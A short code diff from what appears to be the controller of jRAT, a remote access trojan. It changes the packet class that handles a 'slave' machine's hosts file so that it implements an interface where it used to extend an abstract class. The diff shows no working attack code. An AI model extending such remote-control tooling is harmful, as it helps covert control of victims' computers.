@@ -5,7 +5,7 @@ import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlHostsFile;
 
 
-public class Packet38HostFile extends AbstractIncomingPacket {
+public class Packet38HostFile implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
